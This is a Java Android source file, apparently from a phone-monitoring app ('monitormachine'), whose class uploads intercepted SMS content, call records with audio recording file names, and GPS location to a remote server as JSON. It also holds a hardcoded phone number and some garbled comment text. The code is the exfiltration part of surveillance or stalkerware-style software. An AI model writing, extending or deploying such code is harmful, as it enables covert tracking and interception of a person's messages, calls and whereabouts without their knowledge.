package com.liuchengjie.monitormachine;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;

import org.json.JSONObject;

import android.util.Log;

public class SendHttpRequest implements Runnable {

	private String url;
	private HashMap<String, Object> hmp = new HashMap<String, Object>();
	
	public SendHttpRequest(String url, HashMap<String, Object> hmp){
		this.url = url;
		this.hmp = hmp;
	}
	
	@Override
	public void run() {
		// TODO Auto-generated method stub

		try{
			URL url = new URL(this.url);
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("POST");
			connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
			connection.setDoOutput(true);
			connection.setUseCaches(false);
			connection.setRequestProperty("Charset", "UTF-8");
			//set timeout duration
			connection.setConnectTimeout(8000);
			//set read timeout
			connection.setReadTimeout(8000);
			//open output stream
			OutputStream os = connection.getOutputStream();
//			Log.i("messageBody", messageBody);
			System.out.println("============");
//			System.out.println(messageBody);
//			Log.v("Cat", sender);
			//make json params
			JSONObject json = new JSONObject();
			if(this.url.contains("/sms/add")){
				if(this.hmp.get("operate_kind").equals(0)){
					json.put("receive_phone_number", this.hmp.get("address"));
					json.put("send_phone_number", "15580087385");
					json.put("operate_time", this.hmp.get("datetime"));
					json.put("operate_kind", 0);
					json.put("sms_content", this.hmp.get("content"));
				} else if(this.hmp.get("operate_kind").equals(1)){
					
				}
			} else if(this.url.contains("/call/add")){
				json.put("send_phone_number", this.hmp.get("send_phone_number"));
				json.put("receive_phone_number", this.hmp.get("receive_phone_number"));
				json.put("operate_kind", this.hmp.get("operate_kind"));
				json.put("start_call_time", this.hmp.get("start_time"));
				json.put("end_call_time", this.hmp.get("stop_time"));
				json.put("audio_file_name", this.hmp.get("audio_file_name"));
				//���￪ʼ��¼���ļ��������������ȥ
			} else if(this.url.contains("/location/update")) {
				json.put("altitude", hmp.get("al"));
				json.put("longitude", hmp.get("lng"));
				json.put("latitude", hmp.get("lat"));
				json.put("update_time", hmp.get("update_time"));
				json.put("location_provider", hmp.get("provider"));
			}
			
//			json.put("send_phone_number", sender);
			//here should change
//			json.put("receive_phone_number", "15580087385");
//			json.put("operate_time", datetime);
//			json.put("sms_content", messageBody);
//			json.put("operate_kind", 1);
//			Log.v("Cat", json.toString());
			//send this request
			os.write(json.toString().getBytes());
			os.flush();
			InputStream is = connection.getInputStream();
			BufferedReader br = new BufferedReader(new InputStreamReader(is));
			//get message from server
			String result = br.readLine();
			Log.v("status_code", String.valueOf(connection.getResponseCode()));
			Log.v("return_data", result);
			is.close();
			os.close();
			br.close();
			connection.disconnect();
		} catch(Exception e) {
			e.printStackTrace();
		}
	}

}
